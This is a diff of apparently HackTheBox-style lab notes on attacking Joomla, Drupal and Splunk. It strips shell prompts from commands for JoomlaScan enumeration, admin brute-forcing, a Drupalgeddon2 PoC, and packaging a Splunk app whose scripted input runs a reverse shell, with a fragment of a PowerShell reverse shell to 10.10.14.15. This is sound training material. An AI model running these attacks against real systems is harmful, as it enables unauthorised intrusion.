@@ -29,21 +29,21 @@ droopescan scan joomla --url http://dev.inlanefreight.local/
 As we can see, it did not turn up much information aside from the possible version number. We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool. `JoomlaScan` is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure some dependencies are installed.
 
 ```shell-session
-fango@htb[/htb]$ sudo python2.7 -m pip install urllib3
-fango@htb[/htb]$ sudo python2.7 -m pip install certifi
-fango@htb[/htb]$ sudo python2.7 -m pip install bs4
+sudo python2.7 -m pip install urllib3
+sudo python2.7 -m pip install certifi
+sudo python2.7 -m pip install bs4
 ```
 
 While a bit out of date, it can be helpful in our enumeration. Let's run a scan.
 
 ```shell
-fango@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local
+python2.7 joomlascan.py -u http://dev.inlanefreight.local
 ```
 
 We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.
 
 ```shell
-fango@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 ```
 
 ## Drupal
@@ -75,7 +75,7 @@ We could also use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7
 We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.
 
 ```shell
-fango@htb[/htb]$ python3 drupalgeddon2.py
+python3 drupalgeddon2.py
 ```
 
 **Drupalgeddon3**
@@ -281,7 +281,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $
 The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.
 
 ```shell
-fango@htb[/htb]$ cat inputs.conf 
+cat inputs.conf 
 
 [script://./bin/rev.py]
 disabled = 0  
@@ -305,7 +305,7 @@ Exit
 Once the files are created, we can create a tarball or `.spl` file.
 
 ```shell
-fango@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/
+tar -cvzf updater.tar.gz splunk_shell/
 
 splunk_shell/
 splunk_shell/bin/
